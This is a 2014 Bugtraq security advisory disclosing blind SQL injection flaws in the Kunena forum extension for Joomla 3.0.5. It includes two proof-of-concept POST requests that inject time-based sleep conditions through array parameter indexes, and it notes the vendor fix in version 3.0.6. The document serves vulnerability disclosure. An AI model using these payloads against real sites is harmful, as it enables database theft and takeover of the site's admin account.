
Date: Mon, 28 Jul 2014 10:13:04 GMT
From: vulns@...nach.com
To: bugtraq@...urityfocus.com
Subject: Kunena Forum Extension for Joomla Multiple SQL Injection
 Vulnerabilities

Kunena forum extension for Joomla multiple SQL injection vulnerabilities

Class:			Input Validation Error
CVE:			N/A
Remote:			Yes
Local:			No
Published:		02/07/2014

Credit:			Raymond Rizk of Dionach (vulns@...nach.com)
Vendor:			Kunena
Vulnerable:		Kunena v3.0.5
Solution Status:	Fixed by Vendor

Kunena Forum is prone to multiple SQL inject vulnerabilities because it fails to sufficiently sanitize user-supplied data.

An attacker may leverage this issue to read information stored in the database. This could allow them to retrieve the Joomla admin credentials which lead to the full compromise of the website.

Kunena v3.0.5 is known to be vulnerable. Earlier versions may also be vulnerable.

To exploit this issue, an attacker must be able to POST messages to the forum. The vulnerability affects all pages/tasks that use parameters in the form of �parameter[]�. This is because the array index is not being validated. An attacker can inject the SQL query between the brackets as shown in the proof of concept example below:

True condition will cause a 10 second delay in the server�s response:

POST /index.php?option=com_kunena&view=home&defaultmenu=130&Itemid=128
view=topics&0b4b16219de03f54bd92a580f9d4fa43=1&topics[2)+and+(if(1%3d1,sleep(10),1))%3d1%23]=1&task=unfavorite&kcheckgo=Go

False condition will cause the server to respond without delay:

POST /index.php?option=com_kunena&view=home&defaultmenu=130&Itemid=128
view=topics&0b4b16219de03f54bd92a580f9d4fa43=1&topics[2)+and+(if(1%3d2,sleep(10),1))%3d1%23]=1&task=unfavorite&kcheckgo=Go

Vendor informed and a new version (3.0.6) was released on 28/07/2014. Vendor recommends updating Kunena to the latest version.
